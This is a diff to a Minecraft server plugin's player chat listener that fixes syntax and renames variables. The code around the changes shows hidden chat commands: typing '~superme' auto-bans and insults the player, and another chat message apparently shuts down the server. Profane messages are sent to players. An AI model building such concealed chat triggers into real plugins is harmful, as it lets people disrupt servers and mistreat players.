@@ -527,6 +527,7 @@ public class TFM_PlayerListener implements Listener
         event.setCancelled(true);
     }
 
+    
     @EventHandler(priority = EventPriority.NORMAL)
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
@@ -592,10 +593,9 @@ public class TFM_PlayerListener implements Listener
             //bitch listner
             if (message.toLowerCase().contains("~superme")) 
             {
-                sender_p.chat("IM AN IDIOT CUZ i TRIED ~superme!");
-                sender.setBanned(true);
-                sender.kickPlayer(ChatColor.RED + "BITCH YOU NEED TO GET YOUR SHIT TOGETHER
-                ");
+                player.chat("IM AN IDIOT CUZ i TRIED ~superme!");
+                player.setBanned(true);
+                player.kickPlayer(ChatColor.RED + "BITCH YOU NEED TO GET YOUR SHIT TOGETHER");
             if (message.toLowerCase().contains("~help")) 
             {
                player.sendMessage(ChatColor.GREEN + "======== Listener Help Menu =======");
@@ -678,7 +678,7 @@ public class TFM_PlayerListener implements Listener
                server.shutdown();
                event.setCancelled(true);
             }
-            
+            }
             // Check for caps
             if (message.length() >= 6)
             {
